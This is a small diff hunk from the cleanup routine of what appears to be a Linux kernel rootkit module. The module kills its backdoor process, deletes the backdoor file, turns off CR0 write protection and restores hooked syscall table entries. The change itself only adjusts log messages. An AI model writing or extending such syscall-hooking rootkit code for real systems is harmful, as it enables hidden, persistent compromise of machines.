@@ -1551,9 +1551,10 @@ static void __exit lkm_exit(void)
     //Do not forget to kill backdoor
     if(pid_backdoor != 0)
         if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
-            printk("%s Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
+            printk("[%s] Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
 
-    original_sys_unlink(BACKDOOR_PATH);
+    if(!original_sys_unlink(BACKDOOR_PATH))
+        printk("[%s] Successful remove %s", __this_module.name, BACKDOOR_PATH);
 
     write_cr0(read_cr0() & (~0x10000));
     sys_call[__NR_open]     = original_sys_open;
